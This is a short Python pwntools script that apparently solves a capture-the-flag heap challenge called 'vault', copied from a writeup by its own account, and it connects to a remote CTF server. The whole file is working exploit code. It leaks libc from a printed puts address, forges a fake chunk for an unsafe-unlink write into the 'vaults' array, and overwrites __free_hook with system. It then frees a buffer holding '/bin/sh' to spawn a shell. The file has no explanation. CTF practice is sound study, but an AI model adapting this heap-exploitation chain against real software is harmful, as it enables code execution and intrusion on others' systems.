# I get this solution from writeup
from pwn import *

context.binary = binary = ELF('./vault', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def create_vault(idx):
        assert idx == 0 or idx == 1
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'create? ', str(idx).encode())

def edit_vault(idx, data):
        assert len(data) <= 0x90
        assert idx == 0 or idx == 1
        p.sendlineafter(b'> ', b'2')
        p.sendline(str(idx).encode())
        p.sendafter(b'vault? ', data)

def free_vault(idx):
        assert idx == 0 or idx == 1
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'free? ', str(idx).encode())

def arbitrary_write(addr, data):
        assert len(data) <= 0x90
        edit_vault(0, p64(0)+p64(libc.symbols._IO_2_1_stderr_)+p64(0)+p64(addr))
        edit_vault(0, data)

#p = process()
p = remote('play.scriptsorcerers.xyz', 10002)

p.recvuntil(b'is ')
puts = int(p.recvline()[:-1], 16)
libc.address = puts - libc.symbols.puts
print(f'libc base @ {hex(libc.address)}')

create_vault(0)
create_vault(1)

fake_chunk = b'\x00\x00\x00\x00\x00\x00\x00\x00'
fake_chunk += b'\x81\x00\x00\x00\x00\x00\x00\x00'
fake_chunk += p64(binary.symbols.vaults-0x18)
fake_chunk += p64(binary.symbols.vaults-0x10)
fake_chunk += b'\x00' * 0x60
fake_chunk += b'\x80\x00\x00\x00\x00\x00\x00\x00'
fake_chunk += b'\x90\x00\x00\x00\x00\x00\x00\x00'

edit_vault(0, fake_chunk)
free_vault(1)

arbitrary_write(libc.symbols.__free_hook, p64(libc.symbols.system))
edit_vault(1, b'/bin/sh\x00')
free_vault(1)